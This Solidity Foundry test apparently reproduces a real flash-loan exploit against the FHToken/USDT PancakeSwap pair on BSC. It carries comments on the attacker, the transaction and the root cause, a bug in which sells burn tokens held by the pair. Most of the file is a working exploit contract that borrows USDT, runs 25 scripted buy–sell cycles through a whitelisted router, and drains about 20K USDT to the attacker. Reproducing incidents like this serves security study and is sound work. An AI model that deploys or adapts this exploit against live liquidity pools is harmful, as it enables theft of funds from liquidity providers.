// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// @KeyInfo - Total Lost : ~19,999 USDT (~$20K)
// Attacker : 0x7FA3bC0d5667fFd14d7ACD6Ce5f2432AC13a6FDA
// Attack Contract : 0x727Fb666E3F2531e807E987532C6e2C22ADC45aD
// Vulnerable Contract : 0xdCf0DFe0053677A67610c6d08EA1f5c78DF8cA37 (FHToken)
// Victim Pair : 0x8f2d1A3992856a860304f1B86534B6B129Cc4df7 (Pancake V2 FH/USDT)
// Attack Tx : https://bscscan.com/tx/0x7a3cadc2f33e000b0091307df62db2f5cc79ab8e0b022fd84de9e1c2c0745bd2
// Block : 117979402 (fork 117979401)

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xdCf0DFe0053677A67610c6d08EA1f5c78DF8cA37#code
// Flash loan (Moolah proxy) : https://bscscan.com/address/0x8f73b65b4caaf64fba2af91cc5d4a2a1318e5d8c

// @Analysis
// Twitter Guy : https://x.com/TenArmorAlert/status/2092427353456812207
//
// Root cause: FHToken._transfer on sells burns 80% of netAmount FROM THE PAIR and
// transfers 20% FROM THE PAIR to the treasury, then sync()s. That depletes LP FH
// reserves that do not belong to the seller. Flash-loan USDT → 25× buy–sell cycles
// drain ~19,999 USDT from the pair. Classic pair-burn / skim-style FoT bug.

address constant ATTACKER = 0x7FA3bC0d5667fFd14d7ACD6Ce5f2432AC13a6FDA;
address constant FH = 0xdCf0DFe0053677A67610c6d08EA1f5c78DF8cA37;
address constant USDT = 0x55d398326f99059fF775485246999027B3197955;
address constant FH_USDT_PAIR = 0x8f2d1A3992856a860304f1B86534B6B129Cc4df7;
address constant MOOLAH = 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C;
// Pancake V3 SwapRouter — buyer-whitelisted on FH; used as buy recipient + sweep.
address constant PANCAKE_V3_ROUTER = 0x1b81D678ffb9C0263b24A97847620C99d213eB14;

uint256 constant FORK_BLOCK = 117_979_401;
uint256 constant FLASH_USDT = 25_999_350_000_000_000_000_000; // 25999.35e18
uint256 constant ITERATIONS = 25;

interface IMoolah {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

interface IMoolahFlashLoanCallback {
    function onMoolahFlashLoan(uint256 assets, bytes calldata data) external;
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IPancakeV3Sweep {
    function sweepToken(address token, uint256 amountMinimum, address recipient) external;
}

contract FalconHeavy_exp is BaseTestWithBalanceLog {
    function setUp() public {
        vm.createSelectFork("bsc", FORK_BLOCK);
        fundingToken = USDT;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(FH, "FH");
        vm.label(USDT, "USDT");
        vm.label(FH_USDT_PAIR, "FH/USDT Pair");
        vm.label(MOOLAH, "Moolah");
        vm.label(PANCAKE_V3_ROUTER, "Pancake V3 Router");
    }

    function testExploit() public balanceLog {
        uint256 pairUsdtBefore = IERC20(USDT).balanceOf(FH_USDT_PAIR);
        uint256 attackerBefore = IERC20(USDT).balanceOf(ATTACKER);

        FalconHeavyExploit exploit = new FalconHeavyExploit(ATTACKER);
        vm.prank(ATTACKER);
        exploit.attack();

        uint256 profit = IERC20(USDT).balanceOf(ATTACKER) - attackerBefore;
        uint256 pairDrain = pairUsdtBefore - IERC20(USDT).balanceOf(FH_USDT_PAIR);

        emit log_named_decimal_uint("Pair USDT drained", pairDrain, 18);
        emit log_named_decimal_uint("Attacker USDT profit", profit, 18);

        // Live attack extracted ~19,999.018 USDT to the EOA and left ~0.48 USDT in the pair.
        assertGt(profit, 19_000 ether, "attacker USDT profit too small");
        assertGt(pairDrain, 19_000 ether, "pair drain too small");
        assertApproxEqAbs(profit, 19_999.018106552928530404 ether, 50 ether, "profit mismatch");
    }
}

contract FalconHeavyExploit is IMoolahFlashLoanCallback {
    address private immutable profitReceiver;

    // Exact USDT→pair transfer sizes from the live attack (25 buy–sell cycles).
    uint256[25] private buyAmounts = [
        19_799_505_000_000_000_000_000,
        4_294_771_867_419_896_586_556,
        2_938_836_021_986_925_319_656,
        2_010_993_233_341_752_866_287,
        1_376_086_911_379_334_382_111,
        941_631_804_758_892_845_619,
        644_341_900_501_565_528_230,
        440_911_705_237_352_658_988,
        301_708_039_883_769_476_703,
        206_453_446_912_923_209_167,
        141_272_422_699_267_044_335,
        96_670_206_837_176_779_256,
        66_149_703_610_845_097_504,
        45_265_065_949_148_704_688,
        30_974_079_754_529_158_785,
        21_195_012_014_733_987_754,
        14_503_369_845_524_790_118,
        9_924_398_095_639_286_004,
        6_791_089_147_541_820_113,
        4_647_021_548_855_906_642,
        3_179_874_215_514_878_363,
        2_175_931_383_185_823_934,
        1_488_951_154_492_865_499,
        1_018_862_799_441_643_929,
        697_189_696_890_783_854
    ];

    constructor(address profitReceiver_) {
        profitReceiver = profitReceiver_;
    }

    function attack() external {
        require(msg.sender == profitReceiver, "only receiver");
        IMoolah(MOOLAH).flashLoan(USDT, FLASH_USDT, "");

        uint256 profit = IERC20(USDT).balanceOf(address(this));
        IERC20(USDT).transfer(profitReceiver, profit);
    }

    function onMoolahFlashLoan(uint256 assets, bytes calldata) external override {
        require(msg.sender == MOOLAH, "not moolah");
        require(assets == FLASH_USDT, "bad flash size");

        for (uint256 i = 0; i < ITERATIONS; i++) {
            _buyFh(buyAmounts[i]);
            _sellFh();
        }

        // Repay zero-fee Moolah flash loan.
        IERC20(USDT).approve(MOOLAH, FLASH_USDT);
        // Moolah pulls via transferFrom after the callback returns; approve is enough.
        // Explicit transfer also works because Moolah does safeTransferFrom for `assets`.
        // Leave approval; callback return triggers the pull.
    }

    function _buyFh(uint256 usdtIn) internal {
        // Direct pair swap: USDT in → FH out to the buyer-whitelisted V3 router,
        // then sweepToken pulls FH to this contract (plain transfer, not a "buy").
        IERC20(USDT).transfer(FH_USDT_PAIR, usdtIn);

        (uint112 r0, uint112 r1,) = IUniswapV2Pair(FH_USDT_PAIR).getReserves();
        // token0 = USDT, token1 = FH
        uint256 amountInWithFee = usdtIn * 9975;
        uint256 fhOut = (amountInWithFee * uint256(r1)) / (uint256(r0) * 10000 + amountInWithFee);
        require(fhOut > 0 && fhOut < r1, "bad fhOut");

        IUniswapV2Pair(FH_USDT_PAIR).swap(0, fhOut, PANCAKE_V3_ROUTER, new bytes(0));
        IPancakeV3Sweep(PANCAKE_V3_ROUTER).sweepToken(FH, 0, address(this));
    }

    function _sellFh() internal {
        uint256 fhBal = IERC20(FH).balanceOf(address(this));
        require(fhBal > 0, "no FH");

        // Sell into the pair. FHToken._transfer (isSell):
        //   1) fee → SLIPPAGE_WALLET from seller
        //   2) burn 80% of netAmount FROM THE PAIR  (@ vuln)
        //   3) 20% of netAmount FROM THE PAIR → TREASURY
        //   4) sync() locks the depleted FH reserve
        //   5) netAmount finally credited to the pair
        IERC20(FH).transfer(FH_USDT_PAIR, fhBal);

        (uint112 r0, uint112 r1,) = IUniswapV2Pair(FH_USDT_PAIR).getReserves();
        uint256 reserveUsdt = uint256(r0);
        uint256 reserveFh = uint256(r1);
        uint256 amountIn = IERC20(FH).balanceOf(FH_USDT_PAIR) - reserveFh;
        require(amountIn > 0, "no excess FH");

        uint256 amountInWithFee = amountIn * 9975;
        uint256 usdtOut = (amountInWithFee * reserveUsdt) / (reserveFh * 10000 + amountInWithFee);
        require(usdtOut > 0 && usdtOut < reserveUsdt, "bad usdtOut");

        IUniswapV2Pair(FH_USDT_PAIR).swap(usdtOut, 0, address(this), new bytes(0));
    }
}
